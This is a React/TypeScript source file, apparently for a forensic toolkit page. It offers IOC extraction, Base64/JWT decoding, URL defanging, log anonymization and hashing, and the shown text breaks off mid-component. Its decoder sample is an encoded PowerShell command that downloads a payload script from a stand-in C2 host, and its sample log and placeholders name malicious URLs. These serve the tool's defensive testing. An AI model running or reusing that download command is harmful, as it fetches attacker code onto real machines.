import { useState } from "react";
import { Layout } from "@/components/Layout";
import {
  Wrench,
  Search,
  Shield,
  Binary,
  Hash,
  EyeOff,
  Globe,
  Clock,
  Copy,
  Check,
  RotateCcw,
  Sparkles,
  Download,
  AlertTriangle,
  ExternalLink,
  Code2,
  Lock,
  ArrowRightLeft,
  Filter,
} from "lucide-react";
import { api } from "@/lib/api";
import { useToast } from "@/hooks/use-toast";

type ToolTab = "ioc" | "decoder" | "ip" | "anonymizer" | "hash" | "timestamp";

const SAMPLE_LOG = `[2026-08-23 04:12:33] WARN  sshd[19284]: Failed password for root from 185.220.101.34 port 54122 ssh2
[2026-08-23 04:12:35] ALERT firewall: Drop inbound from 45.33.32.156 to port 445 (SMB probe)
[2026-08-23 04:14:01] INFO  nginx: GET /api/v1/user?token=Bearer%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTc4NzQ3MzYwMH0.signature HTTP/1.1 from 192.168.1.105
[2026-08-23 04:15:10] CRIT  antivirus: File payload_win32.exe (SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855) matches Trojan.Generic (CVE-2024-38077). Contact sec-ops@threatlens.io or visit http://malicious-c2-node.xyz/beacon`;

export default function ToolsPage() {
  const { toast } = useToast();
  const [activeTab, setActiveTab] = useState<ToolTab>("ioc");
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    toast({ title: "Copied to clipboard!" });
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // ─── 1. IOC Extractor State ───
  const [iocInput, setIocInput] = useState("");
  const [iocResults, setIocResults] = useState<{
    ipv4: string[];
    ipv6: string[];
    sha256: string[];
    sha1: string[];
    md5: string[];
    cve: string[];
    emails: string[];
    urls: string[];
    domains: string[];
  } | null>(null);
  const [iocLoading, setIocLoading] = useState(false);
  const [iocFilter, setIocFilter] = useState<string>("all");

  const handleExtractIocs = async (textToExtract?: string) => {
    const text = textToExtract ?? iocInput;
    if (!text.trim()) {
      toast({ title: "Please enter or paste logs to extract IOCs", variant: "destructive" });
      return;
    }
    setIocLoading(true);
    try {
      const res = await api.extractIocs(text);
      setIocResults(res.iocs);
    } catch {
      toast({ title: "Failed to extract IOCs", variant: "destructive" });
    } finally {
      setIocLoading(false);
    }
  };

  const handleExportIocsJson = () => {
    if (!iocResults) return;
    const blob = new Blob([JSON.stringify(iocResults, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "extracted-iocs.json";
    a.click();
    URL.revokeObjectURL(url);
  };

  // ─── 2. Decoder State ───
  const [decodeInput, setDecodeInput] = useState("");
  const [decodeResults, setDecodeResults] = useState<{
    base64?: string | null;
    hex?: string | null;
    url_decode?: string | null;
    rot13?: string | null;
    jwt?: { header: object; payload: object; signature: string } | null;
  } | null>(null);
  const [decodeLoading, setDecodeLoading] = useState(false);

  const handleDecode = async (textToDecode?: string) => {
    const text = textToDecode ?? decodeInput;
    if (!text.trim()) {
      toast({ title: "Please enter text to decode", variant: "destructive" });
      return;
    }
    setDecodeLoading(true);
    try {
      const res = await api.decodePayload(text);
      setDecodeResults(res.results);
    } catch {
      toast({ title: "Decoding failed", variant: "destructive" });
    } finally {
      setDecodeLoading(false);
    }
  };

  // ─── 3. IP Intelligence & Defanger ───
  const [ipInput, setIpInput] = useState("");
  const [ipResult, setIpResult] = useState<{
    ip: string;
    version: string;
    classification: string;
    is_private: boolean;
    is_global: boolean;
    reverse_dns: string;
    defanged: string;
  } | null>(null);
  const [ipLoading, setIpLoading] = useState(false);

  const handleLookupIp = async (ipToLookup?: string) => {
    const ip = (ipToLookup ?? ipInput).trim();
    if (!ip) {
      toast({ title: "Please enter an IP address", variant: "destructive" });
      return;
    }
    setIpLoading(true);
    try {
      const res = await api.lookupIp(ip);
      setIpResult(res);
    } catch (e: any) {
      toast({ title: "IP Lookup error", description: e.message || "Invalid IP address", variant: "destructive" });
    } finally {
      setIpLoading(false);
    }
  };

  // ─── Defang / Refang quick converter ───
  const [defangInput, setDefangInput] = useState("");
  const [defangOutput, setDefangOutput] = useState("");

  const handleDefang = () => {
    const res = defangInput
      .replace(/http/gi, "hxxp")
      .replace(/\./g, "[.]")
      .replace(/:\/\//g, "[://]");
    setDefangOutput(res);
  };

  const handleRefang = () => {
    const res = defangInput
      .replace(/hxxp/gi, "http")
      .replace(/\[\.\]/g, ".")
      .replace(/\[:\/\/\]/g, "://");
    setDefangOutput(res);
  };

  // ─── 4. Anonymizer State ───
  const [anonInput, setAnonInput] = useState("");
  const [anonOutput, setAnonOutput] = useState("");
  const [anonReplacements, setAnonReplacements] = useState(0);
  const [anonLoading, setAnonLoading] = useState(false);
  const [maskIps, setMaskIps] = useState(true);
  const [maskEmails, setMaskEmails] = useState(true);
  const [maskTokens, setMaskTokens] = useState(true);
  const [maskPasswords, setMaskPasswords] = useState(true);

  const handleAnonymize = async () => {
    if (!anonInput.trim()) {
      toast({ title: "Please enter log content to anonymize", variant: "destructive" });
      return;
    }
    setAnonLoading(true);
    try {
      const res = await api.anonymizeLogs({
        text: anonInput,
        mask_ips: maskIps,
        mask_emails: maskEmails,
        mask_tokens: maskTokens,
        mask_passwords: maskPasswords,
      });
      setAnonOutput(res.anonymized_text);
      setAnonReplacements(res.replacements_count);
    } catch {
      toast({ title: "Anonymization failed", variant: "destructive" });
    } finally {
      setAnonLoading(false);
    }
  };

  // ─── 5. Hash Generator State ───
  const [hashInput, setHashInput] = useState("");
  const [hashResults, setHashResults] = useState<{
    md5: string;
    sha1: string;
    sha256: string;
    sha512: string;
    byte_length: number;
  } | null>(null);
  const [hashLoading, setHashLoading] = useState(false);

  const handleHash = async (textToHash?: string) => {
    const text = textToHash ?? hashInput;
    if (!text) {
      toast({ title: "Please enter text or data to hash", variant: "destructive" });
      return;
    }
    setHashLoading(true);
    try {
      const res = await api.calculateHash(text);
      setHashResults(res);
    } catch {
      toast({ title: "Hash calculation failed", variant: "destructive" });
    } finally {
      setHashLoading(false);
    }
  };

  // ─── 6. Timestamp Converter State ───
  const [epochInput, setEpochInput] = useState(Math.floor(Date.now() / 1000).toString());
  const [isoOutput, setIsoOutput] = useState("");
  const [localOutput, setLocalOutput] = useState("");
  const [utcOutput, setUtcOutput] = useState("");

  const handleConvertTimestamp = (val: string) => {
    setEpochInput(val);
    const num = parseInt(val.trim());
    if (isNaN(num)) {
      setIsoOutput("Invalid timestamp");
      setLocalOutput("");
      setUtcOutput("");
      return;
    }
    // Auto-detect seconds vs milliseconds vs microseconds
    const ms = val.length >= 16 ? Math.floor(num / 1000) : val.length >= 13 ? num : num * 1000;
    const date = new Date(ms);
    if (isNaN(date.getTime())) {
      setIsoOutput("Invalid timestamp");
      setLocalOutput("");
      setUtcOutput("");
      return;
    }
    setIsoOutput(date.toISOString());
    setLocalOutput(date.toString());
    setUtcOutput(date.toUTCString());
  };

  return (
    <Layout>
      <div className="space-y-6 max-w-6xl mx-auto animate-fade-in pb-12">
        {/* Header */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center text-primary border border-primary/20">
              <Wrench className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-xl font-bold text-foreground">Cybersecurity Tools & Utilities</h2>
              <p className="text-sm text-muted-foreground">
                Essential forensic toolset for log investigation, deobfuscation, IOC harvesting, and sanitization
              </p>
            </div>
          </div>
        </div>

        {/* Tab Navigation */}
        <div className="flex flex-wrap items-center gap-2 p-1.5 glass-panel rounded-xl border-slate-800">
          {[
            { id: "ioc", label: "IOC Extractor", icon: Search },
            { id: "decoder", label: "Decoder & JWT", icon: Binary },
            { id: "ip", label: "IP Intelligence & Defanger", icon: Globe },
            { id: "anonymizer", label: "Log Anonymizer", icon: EyeOff },
            { id: "hash", label: "Hash Calculator", icon: Hash },
            { id: "timestamp", label: "Epoch Timestamp", icon: Clock },
          ].map((tab) => {
            const Icon = tab.icon;
            const active = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as ToolTab)}
                className={`flex items-center gap-2 px-3.5 py-2 rounded-lg text-xs font-medium transition-all ${
                  active
                    ? "bg-primary text-white shadow-md shadow-primary/25 border border-primary/40 font-semibold"
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-800/60"
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{tab.label}</span>
              </button>
            );
          })}
        </div>

        {/* ─── TAB 1: IOC EXTRACTOR ─── */}
        {activeTab === "ioc" && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 animate-fade-in">
            {/* Input Panel */}
            <div className="glass-panel rounded-xl p-5 flex flex-col gap-4">
              <div className="flex items-center justify-between">
                <span className="text-sm font-semibold text-foreground flex items-center gap-2">
                  <Search className="w-4 h-4 text-cyan-400" />
                  Raw Logs & Incident Notes
                </span>
                <button
                  onClick={() => {
                    setIocInput(SAMPLE_LOG);
                    handleExtractIocs(SAMPLE_LOG);
                  }}
                  className="text-xs text-primary hover:underline flex items-center gap-1"
                >
                  <Sparkles className="w-3 h-3" /> Load Sample Log
                </button>
              </div>

              <textarea
                value={iocInput}
                onChange={(e) => setIocInput(e.target.value)}
                placeholder="Paste raw log data, firewall dumps, Snort alerts, or incident descriptions here..."
                rows={12}
                className="w-full bg-slate-950/80 border border-slate-800 rounded-lg p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-primary/50 resize-y scrollbar-cyber leading-relaxed"
              />

              <div className="flex items-center justify-between gap-3">
                <button
                  onClick={() => {
                    setIocInput("");
                    setIocResults(null);
                  }}
                  className="px-3 py-1.5 rounded-lg text-xs font-medium text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"
                >
                  Clear
                </button>
                <button
                  onClick={() => handleExtractIocs()}
                  disabled={iocLoading}
                  className="cyber-btn text-xs !px-5 !py-2 flex items-center gap-2 disabled:opacity-50"
                >
                  <Search className="w-3.5 h-3.5" />
                  {iocLoading ? "Extracting IOCs..." : "Harvest Indicators (IOCs)"}
                </button>
              </div>
            </div>

            {/* Results Panel */}
            <div className="glass-panel rounded-xl p-5 flex flex-col gap-4">
              <div className="flex items-center justify-between">
                <span className="text-sm font-semibold text-foreground flex items-center gap-2">
                  <Shield className="w-4 h-4 text-emerald-400" />
                  Extracted Indicators of Compromise
                </span>
                {iocResults && (
                  <button
                    onClick={handleExportIocsJson}
                    className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-medium bg-slate-800 text-slate-300 hover:text-white border border-slate-700 transition-colors"
                  >
                    <Download className="w-3 h-3" /> Export JSON
                  </button>
                )}
              </div>

              {!iocResults ? (
                <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-muted-foreground/60 border border-dashed border-slate-800 rounded-lg">
                  <Search className="w-10 h-10 mb-2 opacity-30" />
                  <p className="text-sm font-medium text-slate-400">No IOCs extracted yet</p>
                  <p className="text-xs text-slate-500 mt-1 max-w-xs">
                    Paste raw logs and click "Harvest Indicators" to automatically extract IP addresses, hashes, CVEs, emails, and URLs.
                  </p>
                </div>
              ) : (
                <div className="space-y-4 overflow-y-auto max-h-[460px] scrollbar-cyber pr-1">
                  {/* Category Sections */}
                  {[
                    { label: "IPv4 Addresses", key: "ipv4", items: iocResults.ipv4, color: "text-cyan-400 bg-cyan-400/10 border-cyan-400/20" },
                    { label: "SHA-256 Hashes", key: "sha256", items: iocResults.sha256, color: "text-purple-400 bg-purple-400/10 border-purple-400/20" },
                    { label: "MD5 / SHA-1 Hashes", key: "hashes", items: [...iocResults.md5, ...iocResults.sha1], color: "text-violet-400 bg-violet-400/10 border-violet-400/20" },
                    { label: "CVE Identifiers", key: "cve", items: iocResults.cve, color: "text-amber-400 bg-amber-400/10 border-amber-400/20" },
                    { label: "URLs & Endpoints", key: "urls", items: iocResults.urls, color: "text-blue-400 bg-blue-400/10 border-blue-400/20" },
                    { label: "Domains", key: "domains", items: iocResults.domains, color: "text-emerald-400 bg-emerald-400/10 border-emerald-400/20" },
                    { label: "Email Addresses", key: "emails", items: iocResults.emails, color: "text-rose-400 bg-rose-400/10 border-rose-400/20" },
                  ].map((category) => {
                    if (category.items.length === 0) return null;
                    return (
                      <div key={category.key} className="space-y-1.5">
                        <div className="flex items-center justify-between text-xs">
                          <span className="font-semibold text-slate-300">
                            {category.label} ({category.items.length})
                          </span>
                          <button
                            onClick={() => copyToClipboard(category.items.join("\n"), category.key)}
                            className="text-[11px] text-slate-400 hover:text-primary transition-colors flex items-center gap-1"
                          >
                            {copiedKey === category.key ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                            Copy All
                          </button>
                        </div>
                        <div className="flex flex-wrap gap-1.5">
                          {category.items.map((item, idx) => (
                            <button
                              key={idx}
                              onClick={() => copyToClipboard(item, `${category.key}-${idx}`)}
                              title="Click to copy"
                              className={`px-2.5 py-1 rounded-md text-xs font-mono border flex items-center gap-1.5 hover:scale-[1.02] transition-transform ${category.color}`}
                            >
                              <span className="truncate max-w-[280px]">{item}</span>
                              {copiedKey === `${category.key}-${idx}` ? (
                                <Check className="w-3 h-3 shrink-0" />
                              ) : (
                                <Copy className="w-3 h-3 shrink-0 opacity-50" />
                              )}
                            </button>
                          ))}
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>
        )}

        {/* ─── TAB 2: DECODER & JWT ─── */}
        {activeTab === "decoder" && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 animate-fade-in">
            {/* Input */}
            <div className="glass-panel rounded-xl p-5 flex flex-col gap-4">
              <div className="flex items-center justify-between">
                <span className="text-sm font-semibold text-foreground flex items-center gap-2">
                  <Binary className="w-4 h-4 text-purple-400" />
                  Encoded Log String / Payload
                </span>
                <div className="flex gap-2">
                  <button
                    onClick={() => {
                      const sampleB64 = "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AbABvAGMAYQBsAC8AcABheQBsAG8AYQBkAC4AcABzADEA";
                      setDecodeInput(sampleB64);
                      handleDecode(sampleB64);
                    }}
                    className="text-[11px] text-primary hover:underline"
                  >
                    B64 Sample
                  </button>
                  <button
                    onClick={() => {
                      const sampleJwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkB0aHJlYXRsZW5zLmlvIiwicm9sZSI6InNlY3VyaXR5X2FkbWluIiwiaWF0IjoxNzg3NDczNjAwLCJleHAiOjE3ODc0NzcyMDB9.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";
                      setDecodeInput(sampleJwt);
                      handleDecode(sampleJwt);
                    }}
                    className="text-[11px] text-purple-400 hover:underline"
                  >
                    JWT Sample
                  </button>
                </div>
              </div>

              <textarea
                value={decodeInput}
                onChange={(e) => setDecodeInput(e.target.value)}
                placeholder="Enter Base64, Hex string (e.g. 0x48656c6c6f), URL-encoded (%20), ROT13, or JWT token..."
                rows={10}
                className="w-full bg-slate-950/80 border border-slate-800 rounded-lg p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-primary/50 resize-y scrollbar-cyber leading-relaxed"
              />

              <div className="flex justify-end">
                <button
                  onClick={() => handleDecode()}
                  disabled={decodeLoading}
                  className="cyber-btn text-xs !px-5 !py-2 flex items-center gap-2 disabled:opacity-50"
                >
                  <Binary className="w-3.5 h-3.5" />
                  {decodeLoading ? "Deobfuscating..." : "Decode & Analyze"}
                </button>
              </div>
            </div>

            {/* Output */}
            <div className="glass-panel rounded-xl p-5 flex flex-col gap-4">
              <span className="text-sm font-semibold text-foreground flex items-center gap-2">
                <Code2 className="w-4 h-4 text-cyan-400" />
                Decoded Output Streams
              </span>

              {!decodeResults ? (
                <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-muted-foreground/60 border border-dashed border-slate-800 rounded-lg">
                  <Binary className="w-10 h-10 mb-2 opacity-30" />
                  <p className="text-sm font-medium text-slate-400">No output yet</p>
                  <p className="text-xs text-slate-500 mt-1 max-w-xs">
                    Supports instant Base64 decoding, Hex conversion, URL decode, ROT13, and JWT structure inspection.
                  </p>
                </div>
              ) : (
                <div className="space-y-4 overflow-y-auto max-h-[460px] scrollbar-cyber pr-1">
                  {/* JWT Decoder */}
                  {decodeResults.jwt && (
                    <div className="p-3.5 rounded-lg bg-purple-950/20 border border-purple-500/30 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-purple-400 uppercase tracking-wider flex items-center gap-1.5">
                          <Lock className="w-3.5 h-3.5" /> JWT Token Structure
                        </span>
                        <button
                          onClick={() => copyToClipboard(JSON.stringify(decodeResults.jwt, null, 2), "jwt")}
                          className="text-xs text-purple-300 hover:text-white flex items-center gap-1"
                        >
                          {copiedKey === "jwt" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                          Copy JSON
                        </button>
                      </div>
                      <div className="space-y-1 text-xs font-mono">
                        <p className="text-slate-400">Header:</p>
                        <pre className="p-2 rounded bg-black/40 text-purple-300 text-[11px] overflow-x-auto">
                          {JSON.stringify(decodeResults.jwt.header, null, 2)}
                        </pre>
                        <p className="text-slate-400 mt-2">Payload (Claims):</p>
                        <pre className="p-2 rounded bg-black/40 text-cyan-300 text-[11px] overflow-x-auto">
                          {JSON.stringify(decodeResults.jwt.payload, null, 2)}
                        </pre>
                      </div>
                    </div>
                  )}

                  {/* Base64 Output */}
                  {decodeResults.base64 && (
                    <div className="p-3 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-cyan-400">Base64 Decoded</span>
                        <button
                          onClick={() => copyToClipboard(decodeResults.base64 || "", "b64")}
                          className="text-xs text-slate-400 hover:text-white flex items-center gap-1"
                        >
                          {copiedKey === "b64" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                          Copy
                        </button>
                      </div>
                      <pre className="p-2 rounded bg-black/40 text-slate-200 text-xs font-mono whitespace-pre-wrap break-all max-h-32 overflow-y-auto">
                        {decodeResults.base64}
                      </pre>
                    </div>
                  )}

                  {/* URL Decode Output */}
                  {decodeResults.url_decode && decodeResults.url_decode !== decodeInput && (
                    <div className="p-3 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-amber-400">URL Decoded</span>
                        <button
                          onClick={() => copyToClipboard(decodeResults.url_decode || "", "url")}
                          className="text-xs text-slate-400 hover:text-white flex items-center gap-1"
                        >
                          {copiedKey === "url" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                          Copy
                        </button>
                      </div>
                      <pre className="p-2 rounded bg-black/40 text-slate-200 text-xs font-mono whitespace-pre-wrap break-all max-h-32 overflow-y-auto">
                        {decodeResults.url_decode}
                      </pre>
                    </div>
                  )}

                  {/* Hex Output */}
                  {decodeResults.hex && (
                    <div className="p-3 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-emerald-400">Hex to ASCII</span>
                        <button
                          onClick={() => copyToClipboard(decodeResults.hex || "", "hex")}
                          className="text-xs text-slate-400 hover:text-white flex items-center gap-1"
                        >
                          {copiedKey === "hex" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                          Copy
                        </button>
                      </div>
                      <pre className="p-2 rounded bg-black/40 text-slate-200 text-xs font-mono whitespace-pre-wrap break-all max-h-32 overflow-y-auto">
                        {decodeResults.hex}
                      </pre>
                    </div>
                  )}

                  {/* ROT13 Output */}
                  {decodeResults.rot13 && decodeResults.rot13 !== decodeInput && (
                    <div className="p-3 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-blue-400">ROT13 Shift</span>
                        <button
                          onClick={() => copyToClipboard(decodeResults.rot13 || "", "rot13")}
                          className="text-xs text-slate-400 hover:text-white flex items-center gap-1"
                        >
                          {copiedKey === "rot13" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                          Copy
                        </button>
                      </div>
                      <pre className="p-2 rounded bg-black/40 text-slate-200 text-xs font-mono whitespace-pre-wrap break-all max-h-32 overflow-y-auto">
                        {decodeResults.rot13}
                      </pre>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
        )}

        {/* ─── TAB 3: IP INTELLIGENCE & DEFANGER ─── */}
        {activeTab === "ip" && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 animate-fade-in">
            {/* IP Intelligence & Classification */}
            <div className="glass-panel rounded-xl p-5 space-y-4">
              <span className="text-sm font-semibold text-foreground flex items-center gap-2">
                <Globe className="w-4 h-4 text-cyan-400" />
                IP Address Intelligence & Subnet Checker
              </span>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={ipInput}
                  onChange={(e) => setIpInput(e.target.value)}
                  placeholder="e.g. 185.220.101.34, 192.168.1.1, 10.0.0.1"
                  className="flex-1 bg-slate-950/80 border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-slate-200 focus:outline-none focus:border-primary/50"
                  onKeyDown={(e) => e.key === "Enter" && handleLookupIp()}
                />
                <button
                  onClick={() => handleLookupIp()}
                  disabled={ipLoading}
                  className="cyber-btn text-xs !px-4 !py-2"
                >
                  {ipLoading ? "Looking up..." : "Lookup IP"}
                </button>
              </div>

              {ipResult && (
                <div className="p-4 rounded-lg bg-slate-900/60 border border-slate-800 space-y-3 animate-fade-in text-xs font-mono">
                  <div className="grid grid-cols-2 gap-3">
                    <div className="p-2.5 rounded bg-black/30 border border-slate-800">
                      <p className="text-slate-400 text-[11px]">IP / Version</p>
                      <p className="text-cyan-400 font-bold text-sm mt-0.5">{ipResult.ip} ({ipResult.version})</p>
                    </div>
                    <div className="p-2.5 rounded bg-black/30 border border-slate-800">
                      <p className="text-slate-400 text-[11px]">Classification</p>
                      <p className={`font-bold text-sm mt-0.5 ${ipResult.is_global ? "text-rose-400" : "text-emerald-400"}`}>
                        {ipResult.classification}
                      </p>
                    </div>
                  </div>

                  <div className="p-2.5 rounded bg-black/30 border border-slate-800">
                    <p className="text-slate-400 text-[11px]">Reverse DNS Hostname</p>
                    <p className="text-slate-200 mt-0.5">{ipResult.reverse_dns}</p>
                  </div>

                  <div className="p-2.5 rounded bg-black/30 border border-slate-800 flex items-center justify-between">
                    <div>
                      <p className="text-slate-400 text-[11px]">Defanged Format (Safe for reports)</p>
                      <p className="text-purple-300 font-bold mt-0.5">{ipResult.defanged}</p>
                    </div>
                    <button
                      onClick={() => copyToClipboard(ipResult.defanged, "defanged-ip")}
                      className="text-slate-400 hover:text-white p-1.5 rounded hover:bg-slate-800"
                    >
                      {copiedKey === "defanged-ip" ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* Quick URL & IP Defanger / Refanger */}
            <div className="glass-panel rounded-xl p-5 space-y-4">
              <span className="text-sm font-semibold text-foreground flex items-center gap-2">
                <ArrowRightLeft className="w-4 h-4 text-amber-400" />
                URL & IOC Defanger / Refanger
              </span>
              <p className="text-xs text-muted-foreground">
                Neutralize active URLs, domains, and IPs to prevent accidental clicks or security scanner triggers when documenting incidents.
              </p>

              <textarea
                value={defangInput}
                onChange={(e) => setDefangInput(e.target.value)}
                placeholder="Paste malicious URLs or IPs: http://malware.evil.com/payload.sh"
                rows={4}
                className="w-full bg-slate-950/80 border border-slate-800 rounded-lg p-2.5 text-xs font-mono text-slate-200 focus:outline-none focus:border-primary/50"
              />

              <div className="flex gap-2">
                <button
                  onClick={handleDefang}
                  className="flex-1 py-1.5 rounded-lg text-xs font-semibold bg-amber-500/15 text-amber-400 border border-amber-500/30 hover:bg-amber-500/25 transition-colors"
                >
                  Defang (hxxp[://]...)
                </button>
                <button
                  onClick={handleRefang}
                  className="flex-1 py-1.5 rounded-lg text-xs font-semibold bg-cyan-500/15 text-cyan-400 border border-cyan-500/30 hover:bg-cyan-500/25 transition-colors"
                >
                  Refang (http://...)
                </button>
              </div>

              {defangOutput && (
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-slate-400">Result:</span>
                    <button
                      onClick={() => copyToClipboard(defangOutput, "defang-out")}
                      className="text-xs text-slate-400 hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === "defang-out" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      Copy
                    </button>
                  </div>
                  <pre className="p-3 rounded-lg bg-black/40 border border-slate-800 text-xs font-mono text-slate-200 whitespace-pre-wrap break-all">
                    {defangOutput}
                  </pre>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ─── TAB 4: LOG ANONYMIZER ─── */}
        {activeTab === "anonymizer" && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 animate-fade-in">
            <div className="glass-panel rounded-xl p-5 flex flex-col gap-4">
              <span className="text-sm font-semibold text-foreground flex items-center gap-2">
                <EyeOff className="w-4 h-4 text-rose-400" />
                Raw Sensitive Logs
              </span>
              <textarea
                value={anonInput}
                onChange={(e) => setAnonInput(e.target.value)}
                placeholder="Paste logs containing sensitive internal IPs, emails, tokens, or credentials..."
                rows={10}
                className="w-full bg-slate-950/80 border border-slate-800 rounded-lg p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-primary/50 resize-y scrollbar-cyber leading-relaxed"
              />

              {/* Toggles */}
              <div className="grid grid-cols-2 gap-2 text-xs">
                <label className="flex items-center gap-2 text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={maskIps}
                    onChange={(e) => setMaskIps(e.target.checked)}
                    className="rounded border-slate-700 text-primary focus:ring-0"
                  />
                  Mask IP Addresses
                </label>
                <label className="flex items-center gap-2 text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={maskEmails}
                    onChange={(e) => setMaskEmails(e.target.checked)}
                    className="rounded border-slate-700 text-primary focus:ring-0"
                  />
                  Mask Email Addresses
                </label>
                <label className="flex items-center gap-2 text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={maskTokens}
                    onChange={(e) => setMaskTokens(e.target.checked)}
                    className="rounded border-slate-700 text-primary focus:ring-0"
                  />
                  Redact Bearer / API Tokens
                </label>
                <label className="flex items-center gap-2 text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={maskPasswords}
                    onChange={(e) => setMaskPasswords(e.target.checked)}
                    className="rounded border-slate-700 text-primary focus:ring-0"
                  />
                  Redact Passwords & Secrets
                </label>
              </div>

              <div className="flex justify-end">
                <button
                  onClick={handleAnonymize}
                  disabled={anonLoading}
                  className="cyber-btn text-xs !px-5 !py-2 flex items-center gap-2 disabled:opacity-50"
                >
                  <EyeOff className="w-3.5 h-3.5" />
                  {anonLoading ? "Sanitizing..." : "Anonymize & Redact"}
                </button>
              </div>
            </div>

            <div className="glass-panel rounded-xl p-5 flex flex-col gap-3">
              <div className="flex items-center justify-between">
                <span className="text-sm font-semibold text-foreground flex items-center gap-2">
                  <Shield className="w-4 h-4 text-emerald-400" />
                  Sanitized Safe Logs
                </span>
                {anonOutput && (
                  <div className="flex items-center gap-2">
                    <span className="text-xs text-emerald-400 font-mono">
                      {anonReplacements} entities masked
                    </span>
                    <button
                      onClick={() => copyToClipboard(anonOutput, "sanitized-logs")}
                      className="text-xs text-slate-400 hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === "sanitized-logs" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      Copy
                    </button>
                  </div>
                )}
              </div>

              <textarea
                value={anonOutput}
                readOnly
                placeholder="Sanitized, safe log stream will appear here..."
                rows={13}
                className="w-full bg-slate-950/90 border border-slate-800 rounded-lg p-3 text-xs font-mono text-emerald-300/90 focus:outline-none resize-y scrollbar-cyber leading-relaxed"
              />
            </div>
          </div>
        )}

        {/* ─── TAB 5: HASH CALCULATOR ─── */}
        {activeTab === "hash" && (
          <div className="glass-panel rounded-xl p-6 space-y-6 animate-fade-in">
            <div className="space-y-1">
              <span className="text-sm font-semibold text-foreground flex items-center gap-2">
                <Hash className="w-4 h-4 text-cyan-400" />
                Cryptographic Hash Generator & Verifier
              </span>
              <p className="text-xs text-muted-foreground">
                Calculate MD5, SHA-1, SHA-256, and SHA-512 hashes for log snippets, script payloads, or binary strings.
              </p>
            </div>

            <div className="space-y-2">
              <textarea
                value={hashInput}
                onChange={(e) => {
                  setHashInput(e.target.value);
                  handleHash(e.target.value);
                }}
                placeholder="Enter string, suspicious script, or payload to calculate hashes in real-time..."
                rows={4}
                className="w-full bg-slate-950/80 border border-slate-800 rounded-lg p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-primary/50"
              />
            </div>

            {hashResults && (
              <div className="space-y-3 font-mono text-xs animate-fade-in">
                {[
                  { label: "SHA-256 (Industry Standard)", value: hashResults.sha256, color: "text-purple-300" },
                  { label: "SHA-1", value: hashResults.sha1, color: "text-cyan-300" },
                  { label: "MD5 (Legacy)", value: hashResults.md5, color: "text-slate-300" },
                  { label: "SHA-512", value: hashResults.sha512, color: "text-emerald-300" },
                ].map((item) => (
                  <div key={item.label} className="p-3 rounded-lg bg-black/40 border border-slate-800 flex items-center justify-between gap-3">
